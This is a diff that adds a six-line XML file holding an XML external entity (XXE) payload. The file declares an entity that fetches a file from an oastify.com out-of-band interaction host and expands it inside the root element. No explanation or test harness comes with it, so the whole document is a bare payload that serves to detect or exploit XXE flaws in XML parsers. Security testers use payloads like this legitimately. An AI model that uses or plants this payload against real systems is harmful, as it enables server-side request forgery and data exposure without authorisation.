@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://qxrumk6121rx40ors181ddnyzp5ntc.oastify.com/test.txt">
+]>
+<r>&sp;</r>
